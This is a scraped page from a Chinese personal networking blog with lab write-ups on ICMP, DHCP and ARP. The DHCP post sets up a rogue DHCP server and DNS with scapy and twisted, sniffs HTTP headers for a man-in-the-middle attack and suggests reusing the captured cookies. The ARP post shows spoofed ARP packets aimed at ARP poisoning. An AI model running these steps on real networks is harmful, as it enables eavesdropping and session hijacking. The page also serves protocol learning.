<h2 id="ICMP与操作系统探测">ICMP与操作系统探测</h2><p><a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>的作者也是xprobe的作者，我不打算继续玩ICMP这项深坑了：</p>
<pre><code><span class="preprocessor"># eix xprobe</span>
* net-analyzer/xprobe
     Available versions:  ~<span class="number">0.3</span>
     Homepage:            http:<span class="comment">//sys-security.com/blog/xprobe2</span>
     Description:         Active OS fingerprinting tool - <span class="keyword">this</span> is Xprobe2
</code></pre><h2 id="ICMP_source_quench">ICMP source quench</h2><p>应该被废弃的(2012年的RFC6633)协议，流量控制应该交给TCP来做。如果要伪造需要猜测TCP序号，端口号等(前八字节)。</p>
<p>我试着发了发包……看样子路由比我的网卡强大太多了。</p>
<h2 id="ICMP_重定向">ICMP 重定向</h2><p>扔一个参考资料，用hping的<a href="http://www.bcitr.com/files/icmp-redir.pdf" target="_blank" rel="external">How To – Poison Route Cache Using ICMP Redirect</a></p>
<p>待我哪天土豪了再说吧……最起码现在我的安卓功能受限，总之我没模拟出来啥效果。反正我在一个网段试了试完全没动静。其实我觉得应该现在操作系统都会检查ICMP报文中的IP报头和IP报文数据前八字节吧。那又得猜TCP端口号和序列号了不是？</p>
<p>FIXME:<a href="http://en.wikipedia.org/wiki/ICMP_tunnel" target="_blank" rel="external">ICMP Tunnel</a>，有空试试。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/07/play-dhcp/" itemprop="url">
                  Playing and Learning DHCP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-07T00:00:00+08:00" content="2014-03-07">
              2014-03-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/07/play-dhcp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/07/play-dhcp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><ul>
<li>scapy：用来伪造dhcp/dns服务器，抓包(调用tcpdump)</li>
<li>tcpdump/wireshark：来观察网络流量。</li>
<li>twisted来建立dns服务器</li>
<li>某个测试机器和某路由无线网络</li>
</ul>
<h2 id="一点DHCP协议基础">一点DHCP协议基础</h2><p>DHCP是，是干啥的呢？简单来说是为了自动化为网络中的主机配置各种配置，包括ip地址，网关，域名服务器等等。</p>
<p>有篇不错的<a href="http://jeffyyko.blog.51cto.com/28563/163168" target="_blank" rel="external">中文教程</a>带你回顾整个dhcp服务过程，然而，事情不总是这样的。比如linux和安卓一般默认就没有arping检查重复ip的过程。</p>
<h2 id="Rogue_DHCP_Server">Rogue DHCP Server</h2><p>流氓服务器，指非法在网络中提供dhcp服务的机器。由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。</p>
<h2 id="一次中间人攻击">一次中间人攻击</h2><p>我们试着搭建一个流氓dhcp服务器来指向错误的网关和dns(即我们自己)。</p>
<p>本机的ip地址是<code>192.168.1.101</code>，这是无线路由中dhcp服务器分配的。为了让实验一定成功，最好干脆把无线路由的dhcp功能关掉，自己手动配置地址<code>192.168.1.101</code>，然后搭建个dhcp服务器。</p>
<p>首先，确认设置ip转发功能：</p>
<pre><code>gentoo ~ <span class="preprocessor"># echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span>
</code></pre><p>首先，用scapy搭建一个dhcp服务器，把网关指向自己。scapy中<code>DHCP_am</code>的设计就是把<code>nameserver</code>也指向网关，可参考源代码。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; dhcp_server= <span class="constant">DHCP_am</span>()
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server.gw=<span class="string">'192.168.1.101'</span>
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server()
</code></pre><p>监听观察，发现默认网关的dhcp服务器竟然给了一个<code>dhcpnak</code>：</p>
<pre><code> ~ ⮀ sudo tcpdump -<span class="tag">i</span> wlan0 port <span class="number">67</span> or port <span class="number">68</span> 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.634526</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">302</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.681009</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.688288</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">314</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.781062</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">56.124282</span> IP <span class="number">192.168</span>.<span class="number">1.1</span><span class="class">.bootps</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">548</span>
</code></pre><p>用twisted建立一个DNS服务器[^1]：</p>
<pre><code><span class="comment">sudo</span> <span class="comment">twistd</span> <span class="literal">-</span><span class="comment">n</span> <span class="comment">dns</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">recursive</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">cache</span>
</code></pre><p>在scapy中开始中间人攻击(窃听)，比如窃听http头：</p>
<pre><code>pkts = sniff(filter=<span class="string">"(tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)) and host 192.168.1.128 and (not host 192.168.1.1)"</span>,iface=<span class="string">"wlan0"</span>, prn=lambda <span class="keyword">x</span>: <span class="keyword">x</span>.<span class="keyword">sprintf</span>(<span class="string">"{IP:<span class="variable">%IP</span>.src% -&gt; <span class="variable">%IP</span>.dst<span class="variable">%\</span>n}{Raw:<span class="variable">%Raw</span>.load<span class="variable">%\</span>n}"</span>))
<span class="number">192.168</span>.<span class="number">1.128</span> -&gt; <span class="number">123.125</span>.<span class="number">70.102</span>
<span class="string">'GET /tongji/anchor?type=webapp_pv&amp;t=1394205309005&amp;page=carousel HTTP/1.1\r\nHost: wk.baidu.com\r\nAccept-Encod此处略去具体信息'</span>
</code></pre><p>搞到cookie后尽情发挥吧，可以用temper data这种东西在火狐里试下。当然，cookie可以在各种地方比如requests啊selenium里啊使用。</p>
<p>完工。其实后来实验时无线路由dhcp服务器被选中了，然后我的rogue dhcp server就一直处于无用状态。</p>
<p>FIXME：可以尝试一个dhcprelease来试着解除租约，可能涉及xid或transaction ID这些东西的监听和伪造。也许会在查阅更多资料后尝试，也许。</p>
<p>Update：以下这个链接做了这些，不过，它怎么获得xid(transaction id)的不是很明白，要赶在dhcp client的dhcprequest发出之后dhcp server返回dhcpack之前向dhcp client注入dhcpnak，好像得在开始建立连接的时候就开始监听，获取transaction id，直接就伪装成dhcp服务器想客户端发送dhcpnak。</p>
<ul>
<li><a href="http://www.backtrack-linux.org/forums/showthread.php?t=25132" target="_blank" rel="external">http://www.backtrack-linux.org/forums/showthread.php?t=25132</a></li>
</ul>
<p>[^1]: 最开始我用scapy来建立dns服务器： <code>dns_spoof()</code>.关于用scapy做DNS转发服务器，参见PacketGeek上scapy的教程<a href="http://thepacketgeek.com/scapy-p-09-scapy-and-dns/" target="_blank" rel="external">Scapy and DNS</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/04/play-arp/" itemprop="url">
                  Playing and Learning ARP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-04T00:00:00+08:00" content="2014-03-04">
              2014-03-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/04/play-arp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/04/play-arp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><p>这是我的工具：</p>
<ul>
<li>一台linux机器，内核支持ip转发，arp代理。带无线网卡和有线网卡。比如一台笔记本电脑。</li>
<li>linux机器装好scapy，tcpdump</li>
<li>网线，不一定是双绞线，现代网卡都应该支持双向通信模式的转换。</li>
<li>一台windows台式机，带有线网卡和接口。</li>
</ul>
<h2 id="一点scapy的小基础">一点scapy的小基础</h2><p>scapy是一种基于python的包操作工具，在python上实现了一种DSL(领域特定语言)。定义一个包很简单。比如一个<code>Ether</code>：</p>
<pre><code><span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>
</code></pre><p>封包里的字段可以<code>ls</code>来查看：</p>
<pre><code><span class="function"><span class="title">ls</span><span class="params">(Ether)</span></span>
</code></pre><p>当我们想让一个Ethernet包封装一个IP包时，仅仅使用一个<code>/</code>:</p>
<pre><code>ip = <span class="function"><span class="title">Ether</span><span class="params">()</span></span>/<span class="function"><span class="title">IP</span><span class="params">()</span></span>
</code></pre><p>当我们想发包时，如果想在第三层上网络层以上发包：</p>
<pre><code><span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
</code></pre><p>但你要发一个ARP包(在第二层上发包)的话，要用<code>srp</code>或<code>srp1</code>。</p>
<h2 id="arp如何工作">arp如何工作</h2><p>计算机仅仅知道ip地址是无法通信的，ip数据报在封装到数据链路层中时需要加上比如以太网报头，报头中应该含有数据链路层能理解的地址即MAC地址。ARP就是着么一种将IP转换成MAC地址的协议。</p>
<p>如下例子，当我们Ping一台机器时，如果该ip在arp缓存中有，就可以直接找到mac地址，如果没有，就会广播一个请求询问对应ip的mac地址。</p>
<pre><code>~/Work/project/arp-pos ⮀ sudo arp -d <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
~/Work/project/arp-pos ⮀ ping -c <span class="number">1</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> <span class="built_in">time</span>=<span class="number">142</span> ms

<span class="comment">--- 192.168.1.113 ping statistics ---</span>
<span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, <span class="built_in">time</span> <span class="number">0</span>ms
rtt <span class="built_in">min</span>/<span class="built_in">avg</span>/<span class="built_in">max</span>/mdev = <span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">0.000</span> ms

 ~ ⮀ sudo tcpdump -vv -eqtnni wlan0 arp
tcpdump: listening <span class="command"><span class="keyword">on</span> <span class="title">wlan0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.106</span>, <span class="built_in">length</span> <span class="number">28</span>
<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> is-<span class="keyword">at</span> <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>, <span class="built_in">length</span> <span class="number">28</span>
</code></pre><h2 id="抓包观察">抓包观察</h2><p>让我们看看机器获取IP的过程。这里我们用tcpdump，你可以在任何linux发行版的源里找到它。当然，也可以用wireshark。</p>
<pre><code> ~ ⮀ sudo tcpdump -e -i wlan0 port bootps or port bootpc or arp
tcpdump: WARNING: wlan0: no IPv4 address assigned
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> wlan0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.202074</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">371</span>: <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>.bootpc &gt; <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>.bootps: BOOTP/DHCP, Request <span class="keyword">from</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">329</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.277875</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">590</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>.bootps &gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>.bootpc: BOOTP/DHCP, Reply, <span class="keyword">length</span> <span class="number">548</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.352068</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">20.720541</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">22.155087</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">24.232076</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">26.234201</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.502047</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.514492</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="keyword">is</span>-<span class="keyword">at</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>可以看到，先是dhcp的过程，下次我们再讲。紧接着我们的机器发出一个ARP探针(Probe)，哦，发了好几次来确认没有机器使用<code>192.168.1.1</code>，于是接着发了两个announcement宣告拥有了这个ip。接着询问<code>192.168.1.1</code>的MAC地址并收到来自<code>192.168.1.1</code>的回复。</p>
<h2 id="一个广播的ARP请求">一个广播的ARP请求</h2><p>为了实验正确，我们先删除arp缓存内容：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -d <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
  <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>                    (incomplete)                              eth0
</code></pre><p>首先，我们作为<code>10.210.96.200</code>，想知道<code>10.210.96.193</code>的MAC地址，我们广播一个ARP请求：</p>
<pre><code>我是<span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>,我的MAC地址是<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>,我想知道<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>的IP地址是什么。
</code></pre><p>让我们先探索下ARP包的结构。</p>
<pre><code>&gt;&gt;&gt; ls(ARP)
<span class="string">hwtype     :</span> XShortField          = (<span class="number">1</span>)
<span class="string">ptype      :</span> XShortEnumField      = (<span class="number">2048</span>)
<span class="string">hwlen      :</span> ByteField            = (<span class="number">6</span>)
<span class="string">plen       :</span> ByteField            = (<span class="number">4</span>)
<span class="string">op         :</span> ShortEnumField       = (<span class="number">1</span>)
<span class="string">hwsrc      :</span> ARPSourceMACField    = (None)
<span class="string">psrc       :</span> SourceIPField        = (None)
<span class="string">hwdst      :</span> MACField             = (<span class="string">'00:00:00:00:00:00'</span>)
<span class="string">pdst       :</span> IPField              = (<span class="string">'0.0.0.0'</span>)
</code></pre><p>参见<a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure" target="_blank" rel="external">ARP协议封包结构</a></p>
<p>首先我们构造一个ARP请求。该请求工作在Ethernet上(<code>0x0001</code>)，协议类型是IPv4(<code>0x0800</code>), 是一个请求(<code>0x0001</code>或<code>who-has</code>)，发送者的MAC地址是<code>11:11:11:11:11:11</code>, 发送者的协议地址是<code>10.210.96.200</code>，想要知道MAC地址的协议地址是<code>10.210.96.193</code>。根据以太网包字段，该消息通过广播发送。</p>
<pre><code>arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'10.210.96.200'</span>, pdst=<span class="string">'10.210.96.193'</span>)</span></span>
</code></pre><p>scapy会自动为我们设置<code>Ether</code>的某些字段，所以我们不用都指定。</p>
<pre><code>&gt;&gt;&gt; arp_request.show()
<span class="preprocessor">###[ Ethernet ]###</span>
  dst= ff:ff:ff:ff:ff:ff
  src= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="preprocessor">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
     psrc= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
     hwdst= <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>
     pdst= <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
</code></pre><p>紧接着发送它：</p>
<pre><code>&gt;&gt;&gt; recv = srp(arp_request)
Begin emission:
Finished to send <span class="number">1</span> packets.
*
Received <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
&gt;&gt;&gt; recv
(&lt;Results: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">1</span>&gt;, &lt;Unanswered: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)
&gt;&gt;&gt; recv[<span class="number">0</span>].show()
<span class="number">0000</span> Ether / ARP who has <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> says <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> ==&gt; Ether / ARP is at <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad says <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> / Padding
</code></pre><p>可见我们得到了它的MAC地址。检查ARP缓存：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>            ether   <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad   C                     eth0
</code></pre><p>Bingo!</p>
<h2 id="一个ARP应答">一个ARP应答</h2><p>首先要设置静态IP。将一台win7机器设置为<code>172.16.0.17</code>.</p>
<p>接着我们要发一个不请自答的ARP reply，这一技术常用来进行ARP Poison。</p>
<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.28'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span></span>
</code></pre><p>查看我们的监听：</p>
<pre><code> ~ ⮀ sudo  tcpdump -nni eth0 arp 
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">17</span>:<span class="number">22</span>:<span class="number">10.465636</span> ARP, Reply <span class="number">172.16</span><span class="number">.0</span><span class="number">.28</span> <span class="keyword">is</span>-<span class="keyword">at</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>然而检查另一台机器的arp缓存可能并没有<code>172.16.0.28</code>的项。这是因为操作系统可能不欢迎不请自来的arp应答。</p>
<p>我们试着使用不请自来的arp请求看看：</p>
<pre><code>&gt;&gt;&gt; arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.22'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_request)</span></span>
</code></pre><p>则可以在另一台机器上的缓存表中发现<code>172.16.0.22</code>的项。说明操作系统默默接受了不请自来的请求。</p>
<p>为了查看ARP响应的效果，我们同时打开两边机器，创造一个请求。先清空windows机器的缓存表。</p>
<p>我们让windows机器ping<code>172.16.0.30</code>。同时开始抓包和准备应答(在win7上ping的同时执行下列命令)：</p>
